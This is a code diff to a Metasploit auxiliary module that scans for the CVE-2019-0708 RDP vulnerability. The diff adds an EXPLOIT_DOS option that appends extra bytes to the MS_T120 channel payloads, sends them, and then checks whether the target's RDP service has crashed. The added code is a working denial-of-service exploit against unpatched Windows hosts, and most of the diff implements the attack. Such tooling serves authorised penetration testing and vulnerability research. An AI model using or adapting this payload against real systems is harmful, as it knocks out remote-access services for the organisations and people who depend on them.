@@ -16,13 +16,14 @@ class MetasploitModule < Msf::Auxiliary
         This module checks a range of hosts for the CVE-2019-0708 vulnerability
         by binding the MS_T120 channel outside of its normal slot and sending
         non-DoS packets which respond differently on patched and vulnerable hosts.
+        It can optionally trigger the DoS vulnerability.
       },
       'Author'         =>
         [
           'National Cyber Security Centre', # Discovery
           'JaGoTu',                         # Module
           'zerosum0x0',                     # Module
-          'Tom Sellers'                     # TLS support and documented packets
+          'Tom Sellers'                     # TLS support, packet documenentation, DoS implementation
         ],
       'References'     =>
         [
@@ -40,10 +41,11 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        OptString.new('RDP_USER', [ false, 'The username to report during connect, UNSET = random']),
+        OptBool.new('EXPLOIT_DOS',       [ false, 'Trigger denial of service vulnerability.']),
+        OptString.new('RDP_USER',        [ false, 'The username to report during connect, UNSET = random']),
         OptString.new('RDP_CLIENT_NAME', [ false, 'The client computer name to report during connect, UNSET = random', 'rdesktop']),
-        OptString.new('RDP_DOMAIN', [ false, 'The client domain name to report during connect']),
-        OptAddress.new('RDP_CLIENT_IP', [ true, 'The client IPv4 address to report during connect', '192.168.0.100']),
+        OptString.new('RDP_DOMAIN',      [ false, 'The client domain name to report during connect']),
+        OptAddress.new('RDP_CLIENT_IP',  [ true, 'The client IPv4 address to report during connect', '192.168.0.100']),
         Opt::RPORT(3389)
       ])
   end
@@ -73,6 +75,18 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     status
+  end
+
+  def rdp_reachable
+    begin
+      connect
+      disconnect
+      return true
+    rescue Rex::ConnectionRefused
+      return false
+    rescue Rex::ConnectionTimeout
+      return false
+    end
   end
 
   def check_host(ip)
@@ -194,10 +208,20 @@ class MetasploitModule < Msf::Auxiliary
     # which is an MCS Disconnect Provider Ultimatum or a timeout.
 
     # 0x03 = CHANNEL_FLAG_FIRST | CHANNEL_FLAG_LAST
-    x86_payload = build_virtual_channel_pdu(0x03, ["00000000020000000000000000000000"].pack("H*"))
-    x64_payload = build_virtual_channel_pdu(0x03, ["0000000000000000020000000000000000000000000000000000000000000000"].pack("H*"))
+    x86_string = "00000000020000000000000000000000"
+    x86_string += "FF" * 8 if datastore['EXPLOIT_DOS']
+    x86_payload = build_virtual_channel_pdu(0x03, [x86_string].pack("H*"))
 
-    vprint_status("Sending patch check payloads")
+    x64_string = "0000000000000000020000000000000000000000000000000000000000000000"
+    x64_string += "FF" * 8 if datastore['EXPLOIT_DOS']
+    x64_payload = build_virtual_channel_pdu(0x03, [x64_string].pack("H*"))
+
+    if datastore['EXPLOIT_DOS']
+      vprint_status("Sending denial of service payloads")
+    else
+      vprint_status("Sending patch check payloads")
+    end
+
     for j in 0..5
 
       # 0xed03 = Channel 1005
@@ -205,6 +229,21 @@ class MetasploitModule < Msf::Auxiliary
       rdp_send(x86_packet)
       x64_packet = rdp_build_pkt(x64_payload, "\x03\xed")
       rdp_send(x64_packet)
+
+      # A single pass should be sufficient to cause DoS
+      if datastore['EXPLOIT_DOS']
+        # Sleeping a second before disconnect makes this much more reliable
+        sleep(1)
+        disconnect
+        sleep(1)
+        if !rdp_reachable
+          print_good("Target service appears to have been successfully crashed.")
+          return Exploit::CheckCode::Vulnerable
+        else
+          print_error("Target doesn't appear to have been crashed.")
+          return Exploit::CheckCode::Unknown
+        end
+      end
 
       # Quick check for the Ultimatum PDU
       begin
